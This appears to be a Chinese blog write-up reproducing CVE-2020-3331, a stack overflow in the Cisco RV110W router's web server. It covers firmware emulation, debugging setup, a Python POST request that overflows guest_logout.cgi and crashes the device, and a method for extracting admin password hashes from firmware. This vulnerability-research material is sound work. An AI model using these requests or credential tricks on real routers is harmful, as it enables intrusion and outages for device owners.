<p>所以这些 Web 服务程序在启动的时候，会先访问 nvram 中存储的数据，还原之前做过的配置。<del>可是为什么会找不到呢？</del> 显然目前我们用 qemu 模拟的环境下，没有它需要的 nvram。也不能直接拷个 nvram 进去吧，数据错了可能会影响到后续程序的利用。简单粗暴些，不让它从 /dev/nvram 找数据。不过这应该只是用 qemu 模拟嵌入式设备的时候才需要这么做，目的是让目标程序运行。</p>
<p>在 ida 中搜索关键字，定位到 nvram_get 函数，再看它的上一步调用。除了图中的 config_key 外，还有ip、mac等数据都需要从 nvram 中读取。看来也不能完全不让它读数据，否则可能会影响程序运行。</p>
<p><img src="https://i.loli.net/2021/09/27/6VoRuWpAyskGDtK.png"></p>
<p>既然如此，这就需要伪造部分重要的数据了。留意到 nvram_get 函数，是从共享库中导入的。我们可以用自己编写的 so 文件，强行 <strong>LD_PRELOAD</strong> ，拦截 nvram_get 的调用。找到一个可用于劫持 libnvram 库中函数调用的工具：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/zcutlip/nvram-faker.git</span><br></pre></td></tr></table></figure>



<p>我们需要修改其下的 nvram-faker.c 为我们需要的劫持的函数内容，在 nvram-faker.h 加上对应的函数声明（如果 c 文件中没导入，也可以不写），再用 buildmipsel.sh 交叉编译出新的 so 文件就可以了。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s.ch331n@ubuntu:~/tools/nvram-faker$ ls</span><br><span class="line">arch.mk         buildmips.sh  Makefile       nvram-faker-internal.h  README.md</span><br><span class="line">buildarm.sh     contrib       nvram-faker.c  nvram_faker_main.c</span><br><span class="line">buildmipsel.sh  LICENSE.txt   nvram-faker.h  nvram.ini</span><br></pre></td></tr></table></figure>



<p>具体 nvram_get 函数要劫持成什么呢？从 init 的地方定位到以下函数，可以看到程序调用 nvram_get 函数，获取了  <strong>lan_ifname</strong> 的值 ，从字面上来看应该是局域网的网卡。这个 sub_40C400 函数还调用了大量的 nvram_set 函数，猜测是在配置一些环境变量。</p>
<p><img src="https://i.loli.net/2021/09/27/MEzcvL3WsBx7aNl.png"></p>
<p>我们这里把  <strong>lan_ifname</strong> 写成回环 ip 就可以了。或者还可以把 <strong>lan_proto</strong> 写成 static，防止程序启动后默认使用 DHCP 自动分配 ip。不过没有改成静态分配也能运行，还没找到为什么，盲猜是因为这里的 proto 默认为 static emm不知道对不对。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">nvram_get</span><span class="params">(<span class="keyword">char</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *value = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(key, <span class="string">&quot;lan_ipaddr&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                value = strdup(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">   	    <span class="comment">/*</span></span><br><span class="line"><span class="comment">   	    if(strcmp(key, &quot;lan_proto&quot;) == 0)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">                value = strdup(&quot;static&quot;);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;nvram_get(%s) == %s\n&quot;</span>, key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="mipsel-linux-gcc"><a href="#mipsel-linux-gcc" class="headerlink" title="mipsel-linux-gcc"></a>mipsel-linux-gcc</h3><p>如果之前没有搭建 MIPSEL 的交叉编译环境，这里会编译失败，因为它调用的是 mipsel-linux-gcc。buildmipsel.sh 大概是找了遍跟 mipsel-linux-gcc 相关的环境变量然后调用，路径不对的时候会找不到，可以在里面加上自己的路径，或者直接改成  mipsel-linux-gcc  编译的命令。感觉都挺麻烦，咱不用它。</p>
<p>用 <code>mipsel-linux-gnu-gcc</code> 也不行。因为我们的编译目标是一个动态链接的文件，其背后的动态库需要是一致的。因此得用 buildroot 的方法自己编译一个，具体原因和方法可以看：<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/tools/2021/02/16/cross/">Clang裁缝店：IoT安全研究视角的交叉编译</a>。不过我们目前只需要 gcc，等到 buildroot 编译完 gcc 直接中断编译，拿 gcc 来用也行，路径在：<code>./buildroot/output/host/bin/</code> 。</p>
<p>buildroot 时需要选择跟本机对应的 linux 版本。我原本用的 buildroot 版本是今年8月的最新版，没有 <code>4.15.x</code> 的选项emm，手动选择的选项好像被禁掉了。于是换成了18年5月的版本：<a target="_blank" rel="noopener" href="https://buildroot.org/downloads/">https://buildroot.org/downloads/</a> 。（建议尽量选发布时间跟自己的 ubuntu 发布时间相近的）。这下终于可以了：</p>
<p><img src="https://i.loli.net/2021/09/27/N5BDWoZw6LhqSaV.png"></p>
<p>不过用 buildmipsel.sh 编译好像还是有点问题。既然它调用的是 mipsel-linux-gcc，我们直接自己手动编译就好了（用它覆盖原本的 sh 文件也行）：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mipsel-linux-gcc -fPIC -shared nvram-faker.c -o libnvram.so</span><br></pre></td></tr></table></figure>



<p>编译完后上传到文件系统中，再 <strong>LD_PRELOAD</strong> 运行就成功了：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mipsel:~/cve-2020-3331/squashfs-root# chroot . sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BusyBox v1.7.2 (2019-04-22 16:08:01 CST) built-in shell (ash)</span><br><span class="line">Enter &#x27;help&#x27; for a list of built-in commands.</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">bin                               proc</span><br><span class="line">data                              sbin</span><br><span class="line">dev                               sys</span><br><span class="line">etc                               tmp</span><br><span class="line">gdbserver-7.7.1-mipsel-mips32-v1  usr</span><br><span class="line">lib                               var</span><br><span class="line">libnvram.so                       www</span><br><span class="line">mnt</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">export</span> LD_PRELOAD=<span class="string">&quot;./libnvram.so&quot;</span> &amp;&amp; /usr/sbin/httpd</span></span><br><span class="line">nvram_get(http_settimeouts) == (null)</span><br><span class="line">nvram_get(http_settimeouts_usec) == (null)</span><br><span class="line">nvram_get(http_debug) == (null)</span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>虽然但是，我随机 nmap 扫描了一下，又开始找不到 nvram了。应该是 nmap 的过程中，宿主机向虚拟机的每个端口都发送了数据包，启动了 httpd 中一些需要读取或设置 nvram 中数据的函数，这些函数都是没被我们劫持的，就报错了：</p>
<p><img src="https://i.loli.net/2021/09/28/OrhbHt4wevVD7FY.png"></p>
<p>看来虚拟环境还是比较适合直接调试 emmm，扫描的工作还是留到真机实验再做吧。我们的目的是调试、打通它的 CVE 漏洞，不必要的报错能避则避（bushi</p>
<h3 id="gdbserver"><a href="#gdbserver" class="headerlink" title="gdbserver"></a>gdbserver</h3><p>说到调试，无论真机还是虚拟环境都需要的，应该就是 gdbserver 了。这里我们用 <a target="_blank" rel="noopener" href="https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F/gdbserver">海特实验室整理的各平台对应的 gdbserver </a>。跟前面的 so 文件一样，把它上传上去再运行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ./gdbserver-7.7.1-mipsel-mips32-v1 :1234 /usr/sbin/httpd</span></span><br><span class="line">Process /usr/sbin/httpd created; pid = 2614</span><br><span class="line">Listening on port 1234</span><br><span class="line">Remote debugging from host 192.168.122.1</span><br></pre></td></tr></table></figure>

<p>这样宿主机的 gdb-multiarch 再remote 过去就可以调试了。上面就是前面说的，直接运行程序的调试方式，在这里不适用。我们 LD_PRELOAD完、程序启动了之后，通过 ps 找到程序 pid，再通过 attach 的方式启动调试：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ./gdbserver-7.7.1-mipsel-mips32-v1 :1235 --attach 2338</span></span><br><span class="line">Attached; pid = 2338</span><br><span class="line">Listening on port 1235</span><br><span class="line">Remote debugging from host 192.168.122.1</span><br></pre></td></tr></table></figure>

<p>可以看到这时 gdb-multiarch remote后，寄存器中是有值的了：</p>
<p><img src="https://i.loli.net/2021/10/01/KulXfc8MsxvUD4w.png"></p>
<h2 id="真机设备"><a href="#真机设备" class="headerlink" title="真机设备"></a>真机设备</h2><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>路由器都会有 WAN 口和 LAN 口，连接方式在 <a target="_blank" rel="noopener" href="https://www.cisco.com/c/dam/en/us/td/docs/routers/csbr/rv130w/quick_start_guide/zh_cn/rv130_rv130w_qsg_zh_cn.pdf">快速入门指南</a> 上有说。但是有认证的校园网插入 WAN 口后应该用不了，我试过将插了校园网网线的ip、subnet mask等数据复制到路由器的配置上，同时设置静态ip，也不行（也许可以44破解方式）。不过漏洞点在后台管理界面，用 LAN 口把路由器和电脑连起来就可以了，上不了网不影响我们复现。</p>
<p>一般刚开机或刚连上的时候，路由器还在进行初始化设置。等到出现以下网卡信息，说明已经配置好了，这时访问 192.168.1.1 就能访问到：</p>
<p><img src="https://i.loli.net/2021/10/10/PBf1KDOq4klxiAs.png"></p>
<p>因为路由器漏洞大部分都是基于 web 服务，虚拟机跟路由器处于同一个局域网中比较方便测试，因此虚拟机需要采用桥接的方式。最好在关机状态下，先设置 VMnet0 网卡的桥接模式，(选自自动或目标网卡），再在编辑网络适配器的地方选择“桥接模式”。</p>
<p><img src="https://i.loli.net/2021/10/10/PDBm9FX5R2s4316.png"></p>
<p>如果每次设置完 VMnet0，再查看的时候发现设置的是仅主机模式，原因是跟主机网卡有关的设置都需要管理员权限。在VMware属性那里，设置每次启动时都用管理员权限运行就行了。</p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>有时候 scp 好使，但它是基于 ssh 服务的，如果真机没有开启就用不了。可以用 web 服务：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 或  python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>

<p>前面是 python3.9 版本的，后面是 python2.7 版本的。</p>
<p>在真机 shell 上下载时注意，要下载到可写的 tmp 目录下，其他目录一般不可写。而且 tmp 目录下新增的文件断电后不保存，每次重启完都得重新上传。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /tmp</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> wget http://192.168.1.100:8000/gdbserver</span></span><br><span class="line">Connecting to 192.168.1.100:8000 (192.168.1.100:8000)</span><br><span class="line">gdbserver            100% |*******************************|  1011k --:--:-- ETA</span><br><span class="line"><span class="meta">#</span><span class="bash"> wget http://192.168.1.100:8000/busybox-mipsel</span></span><br><span class="line">Connecting to 192.168.1.100:8000 (192.168.1.100:8000)</span><br><span class="line">busybox-mipsel       100% |*******************************|  1539k 00:00:00 ETA</span><br></pre></td></tr></table></figure>



<h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><p>前面提到有两种方式。因为真机中的程序大都是运行中的状态，所以这里用 attach 合适些。这里以运行在 443 端口上的 httpd 程序为例，现在我们需要获取它的进程号。</p>
<p>用 ps 查看进程的时候发现，httpd 相关的有两个 pid，区别是一个有 <code>-S</code> ，另一个没有：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ps | grep httpd</span></span><br><span class="line">  415 admin      6284 S   httpd </span><br><span class="line">  516 admin      6416 S   httpd -S </span><br><span class="line">  843 admin      2212 S   grep httpd </span><br></pre></td></tr></table></figure>

<p>后续用 netstat 确定带参数的那个才是运行在端口上的程序。</p>
<p>但一开始使用 netstat 的时候是显示不了 pid 的，我们只能看到在 443 端口上的程序正在监听：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> netstat -pantu</span></span><br><span class="line">netstat: invalid option -- p</span><br><span class="line">BusyBox v1.7.2 (2019-04-22 16:08:01 CST) multi-call binary</span><br><span class="line"></span><br><span class="line">Usage: netstat [-laentuwxrW]</span><br><span class="line"></span><br><span class="line">Display networking information</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">        -l      Display listening server sockets</span><br><span class="line">        -a      Display all sockets (default: connected)</span><br><span class="line">        -e      Display other/more information</span><br><span class="line">        -n      Don&#x27;t resolve names</span><br><span class="line">        -t      Tcp sockets</span><br><span class="line">        -u      Udp sockets</span><br><span class="line">        -w      Raw sockets</span><br><span class="line">        -x      Unix sockets</span><br><span class="line">        -r      Display routing table</span><br><span class="line">        -W      Display with no column truncation</span><br><span class="line"><span class="meta">#</span><span class="bash"> netstat -antu | grep 443</span></span><br><span class="line">tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      </span><br><span class="line">tcp        0      0 :::443                  :::*                    LISTEN   </span><br></pre></td></tr></table></figure>



<p>用上传的 busybox 软件去运行，就有 -p 这个参数。应该是路由器上的 busybox 版本比较老，netstat 不支持查看进程 id。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ./busybox-mipsel netstat -h</span></span><br><span class="line">netstat: invalid option -- h</span><br><span class="line">BusyBox v1.21.1 (2013-07-08 11:09:23 CDT) multi-call binary.</span><br><span class="line"></span><br><span class="line">Usage: netstat [-ral] [-tuwx] [-enWp]</span><br><span class="line"></span><br><span class="line">Display networking information</span><br><span class="line"></span><br><span class="line">        -r      Routing table</span><br><span class="line">        -a      All sockets</span><br><span class="line">        -l      Listening sockets</span><br><span class="line">                Else: connected sockets</span><br><span class="line">        -t      TCP sockets</span><br><span class="line">        -u      UDP sockets</span><br><span class="line">        -w      Raw sockets</span><br><span class="line">        -x      Unix sockets</span><br><span class="line">                Else: all socket types</span><br><span class="line">        -e      Other/more information</span><br><span class="line">        -n      Don&#x27;t resolve names</span><br><span class="line">        -W      Wide display</span><br><span class="line">        -p      Show PID/program name for sockets</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ./busybox-mipsel netstat -pantu | grep 443</span></span><br><span class="line">tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      516/httpd</span><br><span class="line">tcp        0      0 :::443                  :::*                    LISTEN      516/httpd</span><br></pre></td></tr></table></figure>



<h1 id="CVE-2020-3331"><a href="#CVE-2020-3331" class="headerlink" title="CVE-2020-3331"></a>CVE-2020-3331</h1><blockquote>
<p>sscanf 函数中存在栈溢出漏洞，影响的设备是 RV110W，这里复现用的是真机 。</p>
</blockquote>
<h2 id="远程登陆"><a href="#远程登陆" class="headerlink" title="远程登陆"></a>远程登陆</h2><p>受该漏洞影响的固件版本是 1.2.2.5 ，如果真机设备的版本不对，务必进行固件升级。后续调试需要用 telnet 服务，但是我发现真机原本的 1.2.1.7<del>（大概是这个，记不清了）</del>版本，没有开启 telnet 服务。而且手动设置规则也不能成功开启 23 端口，也许只能通过板子上的串口通信才能拿到 shell 了。</p>
<p><img src="https://i.loli.net/2021/10/09/rajoVcqpxg7NMKX.png"></p>
<p>设置好之后，对路由器后台 ip 进行端口扫描，这时候发现 telnet 服务已经开启了：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ch331n@ubuntu:~$ nmap 192.168.1.1</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-09 08:00 PDT</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.015s latency).</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">23/tcp  open  telnet</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br><span class="line">444/tcp open  snpp</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 18.91 seconds</span><br></pre></td></tr></table></figure>



<p>账号密码一般是厂家设置的，如果厂家把账密写在了固件的某个文件中，通过逆向还是能找着的。跟这个 CVE 号相邻的还有个 CVE-2020-3330，受影响的是同一个版本的固件，漏洞正是 telnet 弱口令。因此我们借助它找到账密。相关文章：<a target="_blank" rel="noopener" href="https://blogs.360.cn/post/yi-ge-zi-jie-cha-cuo-dao-zhi-Cisco-fang-huo-qiang-lu-you-qi-yuan-cheng-dai-ma-zhi-xing.html">360：一个字节的差错导致Cisco防火墙路由器远程代码执行</a> 。</p>
<p>从文章 《<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/224301">强网杯2020决赛 ciscoRV110W web服务漏洞复现</a>》发现了个更简单的方式。因为账密的写法是”admin:$(num)$(hash)…”，所以可以通过字符串检索的方式把对应文件中的那一行字符串输出：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . | grep -ri <span class="string">&quot;admin:\\\$&quot;</span></span></span><br><span class="line">Binary file squashfs-root/sbin/rc matches</span><br><span class="line"><span class="meta">$</span><span class="bash"> strings squashfs-root/sbin/rc | grep <span class="string">&quot;admin:\\\$&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>再hash解密就可以了。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote>
<p>mips-32-little; No RELRO; No canary found; NX diasbled; No PIE</p>
</blockquote>
<p>漏洞点在 <strong>httpd</strong> 文件的 <strong>guest_logout_cgi</strong> 函数中。关注到下面的这个 <strong>sscanf</strong> 函数，没有规定数据的长度，存在栈溢出漏洞。而且关于这个函数的漏洞，似乎之前比较常见？前几天绿城杯的 iot 题，出的也是这个漏洞，那道题是 Tenda 路由器 18 年的 CVE。</p>
<p><img src="https://i.loli.net/2021/10/01/wYHtiPjfQeNKRUy.png"></p>
<p>从 sscanf 的参数类型来看， <code>%[^;];%*[^=]=%[^\n]</code> 这一串是 <strong>format</strong> 。该函数将第一个参数 <strong>str</strong> 按照 <strong>format</strong> 的格式过滤、转换，结果存储到后面的变量参数中。而这段 <strong>format</strong> 的语法大概就是：</p>
<ul>
<li><strong>%</strong> 表示选择，选中的子串会被存储到对应的变量中；**%*** 表示不选择，即过滤、忽略。</li>
<li>一般都是 <code>(start char)+(%/%*)+(end char)</code> ，end char 比 start char 多了一个 <strong>[ ]</strong> 以作区分。</li>
</ul>
<p>因此，图中的 <strong>format</strong> 可以理解为：</p>
<ul>
<li>v29 取 <code>;</code> 前的全部内容。</li>
<li>从 <code>;</code> 到第一个 <code>=</code> 的内容不取。</li>
<li>v28 取 <code>=</code> 到 <code>&#39;\n&#39;</code> 的全部内容。</li>
</ul>
<p>也就是如果 v11为 <code>aaa;bbb=ccc\n</code>，则 v29 取的是分号前的 <code>aaa</code>，v28取的是等号后的 <code>ccc</code>。</p>
<p>从后面的 fprintf 函数我们可以知道，v29、v28原本对应的是什么变量：</p>
<p><img src="https://i.loli.net/2021/10/01/mhokus2Eg6tLeHi.png"></p>
<p>也就是说，正常的 v11应该是一个有url、session_id 的字符串。这也是这路由器路径的约定规则，比如下面的这个就是我登陆完后进入后台 Getting Started 页面时的路径，也符合 sscanf 的过滤规则。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://192.168.1.1/default.asp;session_id=03831c9ff52690156d79daab415c7e81</span><br></pre></td></tr></table></figure>

<p>接下来找触发 sscanf 漏洞的条件。首先是其上的 v11，它是从 “submit_button” 获得的，要求包含 “status_guestnet.asp”，也就是 url 里有这个asp。（补：asp 是动态服务器页面，跟 html 文件类似，它的脚本能直接在服务器上执行，有时一些文件下载的程序也是用 asp 写的）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v11 = (<span class="keyword">const</span> <span class="keyword">char</span> *)get_cgi(<span class="string">&quot;submit_button&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v11 )</span><br><span class="line">    v11 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v11, <span class="string">&quot;status_guestnet.asp&quot;</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br></pre></td></tr></table></figure>

<p>接着是其上的 v5、v10 的验证，要求它们分别是 MAC 和 IPv4  格式。我们也可以直接用 bp 抓包，复制自己的mac和 ip 地址来用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v5 = (<span class="keyword">const</span> <span class="keyword">char</span> *)get_cgi(<span class="string">&quot;cmac&quot;</span>);</span><br><span class="line">v10 = (<span class="keyword">const</span> <span class="keyword">char</span> *)get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( VERIFY_MAC_17(v5) &amp;&amp; VERIFY_IPv4(v10) )</span><br><span class="line">&#123;...&#125;</span><br></pre></td></tr></table></figure>

<p>但是这个栈溢出漏洞是在 get 或是 post 方法还不清楚。有一种方法是看代码量，好像一般两种方法的代码量有差异。直接进行发包测试比较直观。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;fe:0e:b1:e6:d8:b4&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line"><span class="comment"># requests.get(url, data=payload, verify=False, timeout=1)</span></span><br><span class="line">requests.post(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>get的时候程序正常。post 的时候已经被覆盖了，程序也直接崩掉，不得不关机重启。</p>
<p><img src="https://i.loli.net/2021/10/10/PZ69XEK4gwYWRo8.png"></p>
<p>最后用 cyclic 测出偏移是85。</p>
<h2 id="libc-基址"><a href="#libc-基址" class="headerlink" title="libc 基址"></a>libc 基址</h2><p>使用 <code>mipsrop.stackfiner()</code> 能在 httpd 中找到 411 条可用的 gadget。注意到这些地址都是 0x00 开头的，由于程序没有开启PIE，这些地址也是程序加载完的地址。但 sscanf 遇 ‘\x00’ 字符会截断，因此这些 gadget 都不能用。</p>
<p><img src="https://i.loli.net/2021/10/10/gEfpbI2TUCYF4sO.png"></p>
<p>我们希望找到一段地址已知且没有 0x00 的gadget。除了 httpd 程序，也许还有其他的没有开启 PIE 的程序能用。cat proc 看了一下，这些程序的加载基址都是 0x00400000，后面很多地址都一样，但共享库的基址不同。</p>
<p><img src="https://i.loli.net/2021/10/10/SFZa71PGxUnE4N6.png"></p>
<p>但是奇怪就奇怪在，每次启动时同一个程序的 libc 基址都没变… 轩哥在<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/">博客</a>中给出了一些猜测的原因和验证。</p>
<p>此时路由器内核的地址随机化保护等级是1：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>关于 linux 内核中对 aslr 的规定：</p>
<ul>
<li>0：关闭地址随机化。不支持随机化的架构以及使用 “norandmaps” 参数启动的内核才会设置。</li>
<li>1：mmap base、stack、VDSO 页地址随机化。也就是共享库、开启 PIE 的文件会加载到随机位置。这也是 <code>CONFIG_COMPAT_BRK</code> 启用时的默认配置。</li>
<li>2：在 1 的基础上启用堆地址随机化（<code>CONFIG_COMPAT_BRK</code> 禁用时的默认配置）。若有古老或损坏的二进制文件，才会启用 <code>CONFIG_COMPAT_BRK</code>，排除堆随机化。</li>
</ul>
<p>现在的情况是，虽然 aslr 等级是 1，但很明显共享库文件的地址没有随机化，就算是将 aslr 等级修改为 2 也是一样。</p>
<p>留意到 <code>CONFIG_COMPAT_BRK</code> 这个宏，启用时默认配置为1，禁用时配置为2。从 <a target="_blank" rel="noopener" href="https://cateee.net/lkddb/web-lkddb/COMPAT_BRK.html">Linux Kernel Driver DataBase: CONFIG_COMPAT_BRK</a> 中找到，这个定义在 <code>init/Kconfig</code> 中的宏，只在 <code>Linux kernels: 2.6.25–2.6.39, 3.0–3.19, 4.0–4.20, 5.0–5.14, 5.15-rc+HEAD</code> 中存在。根据当前路由器的内核版本，我们可以肯定它没有这个宏，因此也无法开启堆随机：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux RV110W 2.6.22 #25 Wed Jul 24 16:11:14 CST 2019 mips unknown</span><br></pre></td></tr></table></figure>

